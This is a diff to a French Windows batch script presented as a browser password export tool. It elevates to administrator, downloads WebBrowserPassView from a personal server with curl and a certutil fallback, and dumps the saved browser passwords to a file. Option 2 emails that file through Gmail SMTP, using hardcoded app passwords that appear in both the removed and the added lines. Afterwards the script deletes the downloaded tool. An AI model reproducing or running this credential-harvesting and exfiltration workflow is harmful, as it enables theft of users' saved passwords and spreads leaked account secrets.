@@ -1,50 +1,63 @@
 @echo off
+setlocal EnableExtensions EnableDelayedExpansion
+chcp 65001 >nul
+title Export mots de passe navigateurs (Nirsoft) - Standalone
+color 0A
 
-rem Elevation en administrateur
+REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-  powershell -Command "Start-Process '%~f0' -Verb RunAs"
-  exit /b
+    echo Ce script requiert des privileges administrateur.
+    echo Demande d'elevation en cours...
+    timeout /t 2 >nul
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
 )
 
+echo ===============================================
+echo   Export mots de passe navigateurs (Nirsoft)
+echo ===============================================
+echo.
+
 set "WBPV=%~dp0WebBrowserPassView.exe"
-set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/general/batch/WebBrowserPassView.exe"
+set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
 set "EMAIL=alexandre.janacek@gmail.com"
 set "DOWNLOADED=0"
-
-rem Configuration email
 set "SMTP_USER=alexandre.janacek@gmail.com"
-set "SMTP_PASS=vdhljbthvrdyneon"
+set "SMTP_PASS=awneqcvfacvcfrzn"
 
-:MENU
+:bpv_menu
 cls
-echo ========================================
-echo    WebBrowserPassView - Export Tool
-echo ========================================
+echo ===============================================
+echo   WEBBROWSERPASSVIEW - EXPORT
+echo ===============================================
 echo.
-echo 1. Enregistrement local uniquement
-echo 2. Enregistrement et envoi par email
+echo   1) Enregistrement local uniquement
+echo   2) Enregistrement et envoi par email
+echo   0) Quitter
 echo.
-echo 0. Quitter
-echo.
-set /p choice="Choisissez une option (1, 2 ou 0): "
+set /p bpv_choice=Votre choix:
 
-if "%choice%"=="1" goto EXPORT
-if "%choice%"=="2" goto EXPORT_AND_SEND
-if "%choice%"=="0" exit /b
-goto MENU
+if "%bpv_choice%"=="1" goto EXPORT
+if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
+if "%bpv_choice%"=="0" goto exit_script
+goto bpv_menu
 
 :EXPORT
 rem Telecharger si necessaire
 if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "$progressPreference='silentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; if (!(Test-Path '%WBPV%')) { Write-Host 'Erreur: Telechargement echoue' -ForegroundColor Red; exit 1 } else { Write-Host 'Telechargement termine!' -ForegroundColor Green }"
-  
+  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
+  if not exist "%WBPV%" (
+    echo Erreur: Telechargement echoue.
+    pause
+    goto bpv_menu
+  )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
-    goto MENU
+    goto bpv_menu
   )
   set "DOWNLOADED=1"
   timeout /t 1 /nobreak >nul
@@ -70,7 +83,7 @@ taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 rem Attendre que le processus se termine completement
 timeout /t 2 /nobreak >nul
 
-rem Supprimer le fichier si telecharge
+rem Nettoyage si telecharge
 if "%DOWNLOADED%"=="1" (
   echo Nettoyage...
   del /F /Q "%WBPV%" >nul 2>&1
@@ -82,13 +95,13 @@ if "%DOWNLOADED%"=="1" (
 if exist "%OUTPUT%" (
   echo Termine. Fichier sauvegarde: %OUTPUT%
   echo.
-  echo Fermeture automatique dans 2 secondes...
+  echo Retour au menu precedent dans 2 secondes...
   timeout /t 2 /nobreak >nul
-  exit /b
+  goto bpv_menu
 ) else (
-  echo ERREUR: Le fichier n a pas ete cree.
+  echo ERREUR: Le fichier n'a pas ete cree.
   pause
-  exit /b
+  goto bpv_menu
 )
 
 :EXPORT_AND_SEND
@@ -96,12 +109,16 @@ rem Telecharger si necessaire
 if not exist "%WBPV%" (
   echo.
   echo Telechargement de WebBrowserPassView.exe...
-  powershell -Command "$progressPreference='silentlyContinue'; Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; if (!(Test-Path '%WBPV%')) { Write-Host 'Erreur: Telechargement echoue' -ForegroundColor Red; exit 1 } else { Write-Host 'Telechargement termine!' -ForegroundColor Green }"
-  
+  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
+  if not exist "%WBPV%" (
+    echo Erreur: Telechargement echoue.
+    pause
+    goto bpv_menu
+  )
   if %errorlevel% neq 0 (
     echo Erreur lors du telechargement.
     pause
-    goto MENU
+    goto bpv_menu
   )
   set "DOWNLOADED=1"
   timeout /t 1 /nobreak >nul
@@ -128,8 +145,7 @@ rem Attendre que le processus se termine completement
 timeout /t 2 /nobreak >nul
 
 if not exist "%OUTPUT%" (
-  echo ERREUR: Le fichier n a pas ete cree.
-  rem Supprimer le fichier si telecharge
+  echo ERREUR: Le fichier n'a pas ete cree.
   if "%DOWNLOADED%"=="1" (
     del /F /Q "%WBPV%" >nul 2>&1
     if exist "%WBPV%" (
@@ -137,44 +153,16 @@ if not exist "%OUTPUT%" (
     )
   )
   pause
-  goto MENU
+  goto bpv_menu
 )
 
 echo Fichier sauvegarde: %OUTPUT%
 echo.
 echo Envoi du fichier par email...
 
-powershell -Command ^
-"$SMTPServer = 'smtp.gmail.com'; ^
-$SMTPPort = 587; ^
-$Username = '%SMTP_USER%'; ^
-$Password = '%SMTP_PASS%'; ^
-$EmailFrom = $Username; ^
-$EmailTo = '%EMAIL%'; ^
-$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
-$Body = 'Export automatique des mots de passe du navigateur.'; ^
-$FilePath = '%OUTPUT%'; ^
-try { ^
-    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
-    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
-    $MailMessage = @{ ^
-        From = $EmailFrom; ^
-        To = $EmailTo; ^
-        Subject = $Subject; ^
-        Body = $Body; ^
-        SmtpServer = $SMTPServer; ^
-        Port = $SMTPPort; ^
-        UseSsl = $true; ^
-        Credential = $Credential; ^
-        Attachments = $FilePath ^
-    }; ^
-    Send-MailMessage @MailMessage; ^
-    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
-} catch { ^
-    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
-}"
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green"
 
-rem Supprimer le fichier si telecharge
+rem Nettoyage si telecharge
 if "%DOWNLOADED%"=="1" (
   echo.
   echo Nettoyage...
@@ -187,7 +175,7 @@ if "%DOWNLOADED%"=="1" (
 echo.
 echo Fermeture automatique dans 2 secondes...
 timeout /t 2 /nobreak >nul
-exit /b
+goto bpv_menu
 
 :GET_UNIQUE_FILENAME
 set "BASE=%~dp0passwords_export"
@@ -198,7 +186,13 @@ set "UNIQUE_FILE=%BASE%%EXT%"
 :CHECK_FILE
 if exist "%UNIQUE_FILE%" (
   set /a COUNTER+=1
-  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
+  set "UNIQUE_FILE=%BASE%_!COUNTER!%EXT%"
   goto CHECK_FILE
 )
 goto :eof
+
+:exit_script
+echo.
+echo Fermeture du script...
+pause
+exit
